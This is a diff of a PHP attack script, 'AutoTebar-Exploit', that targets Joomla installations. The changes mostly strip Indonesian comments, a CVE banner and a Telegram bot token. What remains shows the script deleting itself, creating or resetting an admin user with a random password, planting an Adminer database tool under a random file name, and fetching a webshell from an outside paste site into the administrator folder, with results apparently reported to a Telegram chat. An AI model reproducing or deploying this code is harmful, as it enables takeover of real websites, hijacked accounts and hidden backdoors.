@@ -12,7 +12,7 @@
         @unlink(__FILE__);
     });
 
-    $BOT_TOKEN = "8722546918:AAFu-kO3lBHey71kObeAzc6b9f7FQkbitwQ";
+    $BOT_TOKEN = "aaaa";
     $CHAT_ID   = "8600700974";
 
 
@@ -49,7 +49,7 @@
 
     echo "<pre style='background:#000;color:#0f0;padding:15px;font-family:monospace;'>";
     echo "╔══════════════════════════════════════════════════════════════════╗\n";
-    echo "║   🔥 AutoTebar-Exploit - CVE-2026-48907 (Fixed) 🔥             ║\n";
+    echo "║                    AutoTebar-Exploit                             ║\n";
     echo "║   Time: " . date('Y-m-d H:i:s') . "                              ║\n";
     echo "╚══════════════════════════════════════════════════════════════════╝\n\n";
     @ob_flush(); flush();
@@ -121,18 +121,14 @@
         die("[-] Users table not found!\n");
     }
 
-    // =========================================================================
-    // CEK STRUKTUR TABEL USERS
-    // =========================================================================
+
     $columns = $db->query("DESCRIBE $users_table");
     $col_names = [];
     while ($col = $columns->fetch_assoc()) {
         $col_names[] = $col['Field'];
     }
 
-    // =========================================================================
-    // BUAT / UPDATE USER ADMIN DENGAN PASSWORD RANDOM
-    // =========================================================================
+
     echo "\n[*] Membuat user admin Joomla dengan password random...\n";
     @ob_flush(); flush();
 
@@ -152,7 +148,6 @@
         $user_id = $row['id'];
         echo "[!] User already exists! ID: $user_id\n";
         
-        // Update password
         $upd = $db->query("UPDATE $users_table SET password = '$hash' WHERE id = $user_id");
         if ($upd) {
             echo "[+] ✅ Password updated successfully for user ID: $user_id\n";
@@ -162,7 +157,7 @@
             $ADMIN_STATUS = "UPDATE_FAILED";
         }
     } else {
-        // Buat user baru
+
         $fields = [];
         $values = [];
         
@@ -220,9 +215,6 @@
     echo "[+] Domain: $DOMAIN\n";
     @ob_flush(); flush();
 
-    // =========================================================================
-    // LOCK FOLDER: images
-    // =========================================================================
     echo "\n[*] Mengunci folder images (PHP files return 404)...\n";
     $images_dir = $base . '/images';
     if (!is_dir($images_dir)) {
@@ -304,9 +296,6 @@
     }
     @ob_flush(); flush();
 
-    // =========================================================================
-    // BUAT ADMINER (coba official, fallback lite)
-    // =========================================================================
     $rand2 = substr(md5(mt_rand()), 0, 12);
     $adminer_file = $found_dir . "/{$rand2}.php";
     $adminer_url_full = "FAILED";
@@ -358,9 +347,6 @@
     echo "[+] Adminer: $adminer_url_full\n";
     @ob_flush(); flush();
 
-    // =========================================================================
-    // TAMBAHAN: WEBSHELL DARI PASTE.MANGSUD.ORG
-    // =========================================================================
     echo "\n[*] Menambahkan webshell dari paste.mangsud.org...\n";
     $new_shell_dir = $base . '/administrator/manifests/libraries';
     if (!is_dir($new_shell_dir)) {
